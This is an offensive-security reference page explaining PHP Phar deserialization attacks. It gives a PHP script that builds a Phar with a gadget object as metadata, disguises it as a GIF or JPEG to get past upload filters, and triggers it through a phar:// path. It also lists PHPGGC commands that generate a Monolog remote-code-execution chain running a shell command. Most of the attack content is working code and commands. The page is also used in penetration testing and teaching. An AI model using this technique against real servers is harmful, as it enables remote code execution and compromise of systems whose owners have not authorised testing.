---
title: "Phar deserialization: object injection via phar:// on file operations"
description: "Reaching PHP object injection without an unserialize() call by triggering deserialization of Phar archive metadata when a file function touches a phar:// path."
keywords:
  - phar deserialization
  - phar://
  - object injection
  - metadata unserialize
  - PHPGGC
---

# Phar deserialization

PHP stores a Phar archive's metadata as a serialized PHP object. **On PHP 7.4 and earlier**, the engine deserializes that metadata automatically whenever a file operation accesses the archive through the `phar://` wrapper, before any extraction. On those versions an attacker who can (a) get a crafted Phar onto the server and (b) make almost any file function act on a `phar://` path reaches [PHP object injection](../insecure-deserialization/php-object-injection.md) with **no explicit `unserialize()` in the code**.

**This changed in PHP 8.0.** Touching a `phar://` path (for example with `file_exists()`) no longer unserializes the metadata on its own; the metadata is only deserialized by an explicit `Phar::getMetadata()` call. So on PHP 8.x the automatic-trigger technique below does not fire, and this vector is limited to code paths that explicitly read Phar metadata. Confirm the target runs PHP 7.4 or earlier before relying on it.

## Why it works (PHP <= 7.4)

On vulnerable versions, many functions trigger the metadata deserialization: `file_exists`, `is_file`, `file_get_contents`, `fopen`, `getimagesize`, `stat`, `unlink`, `copy`, and others, as long as the path begins with `phar://`. The gadget chain is identical to ordinary object injection; `phar://` is purely the delivery that gets the serialized object into `unserialize` without the app calling it.

## Building and triggering

Craft a Phar whose metadata is a gadget object, then disguise it to pass upload filters (a Phar can carry a valid image header, so it doubles as a "GIF" or "JPEG"). Note that writing a Phar requires `phar.readonly=0`, which is off by default, so build the archive with it disabled (`php -d phar.readonly=0 build.php`); this only affects *your* build machine, not the target:

```php
<?php
class Gadget {}                      // a class whose magic method starts your chain
$p = new Phar('exploit.phar');
$p->startBuffering();
$p->addFromString('x.txt', 'x');
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');   // image-looking stub
$g = new Gadget();
$g->data = '...';                    // gadget properties
$p->setMetadata($g);                 // serialized into the archive
$p->stopBuffering();
?>
```

Build it, rename to `exploit.gif`, upload it, then point a file-operation sink at it:

```
phar:///var/www/uploads/exploit.gif/x.txt
```

Touching that path deserializes the metadata and runs the chain. In practice **PHPGGC** builds the whole archive for a known framework gadget:

```bash
phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
# polyglot: -pj/--phar-jpeg takes an EXISTING valid JPEG to embed into, and -o names the output
phpggc -pj base.jpg -o exploit.jpg Monolog/RCE1 system 'id'
```

## Exploitation notes

- You need a writable location you can reference (uploads, temp, session files) and a sink that takes a `phar://` path (often an avatar/preview/"check file exists" feature).
- The stub only needs `__HALT_COMPILER();`; prepending image magic bytes defeats content-type and `getimagesize`-based upload checks.
- The automatic trigger is PHP 7.4-and-earlier only (see above); on PHP 8.x fall back to [filter chains to RCE](filter-chains-to-rce.md) or [data and input wrappers](data-and-input-wrappers.md), or find a code path that explicitly calls `Phar::getMetadata()`.

## Tools

- **PHPGGC** with `-p phar` (and `-pj` for polyglots).

## References

- PHP manual: Phar, phar:// wrapper
- PHPGGC project
